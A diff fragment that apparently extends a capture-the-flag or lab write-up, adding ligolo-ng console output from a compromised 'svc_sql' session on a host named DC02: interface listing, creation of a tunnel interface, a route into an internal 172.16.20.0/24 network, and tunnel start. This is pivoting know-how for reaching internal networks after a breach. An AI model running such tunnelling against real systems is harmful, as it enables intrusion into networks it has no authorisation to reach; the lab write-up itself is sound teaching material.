@@ -591,5 +591,33 @@ ligolo-ng » session
 ? Specify a session : 1 - darkzero-ext\svc_sql@DC02 - 10.129.48.21:60783 - 00155df25c01
 [Agent : darkzero-ext\svc_sql@DC02] »
 
+[Agent : darkzero-ext\svc_sql@DC02] » ifconfig 
+┌───────────────────────────────────────────────┐
+│ Interface 0                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ Ethernet                       │
+│ Hardware MAC │ 00:15:5d:f2:5c:01              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 172.16.20.2/24                 │
+└──────────────┴────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Interface 1                                  │
+├──────────────┬───────────────────────────────┤
+│ Name         │ Loopback Pseudo-Interface 1   │
+│ Hardware MAC │                               │
+│ MTU          │ -1                            │
+│ Flags        │ up|loopback|multicast|running │
+│ IPv6 Address │ ::1/128                       │
+│ IPv4 Address │ 127.0.0.1/8                   │
+└──────────────┴───────────────────────────────┘
+[Agent : darkzero-ext\svc_sql@DC02] » ifcreate --name ligolo
+INFO[0077] Creating a new ligolo interface...           
+INFO[0077] Interface created!
 
+[Agent : darkzero-ext\svc_sql@DC02] » route_add --name ligolo --route 172.16.20.0/24
+INFO[0118] Route created.                               
+[Agent : darkzero-ext\svc_sql@DC02] » tunnel_start
+INFO[0122] Starting tunnel to darkzero-ext\svc_sql@DC02 (00155df25c01) 
 ```
+
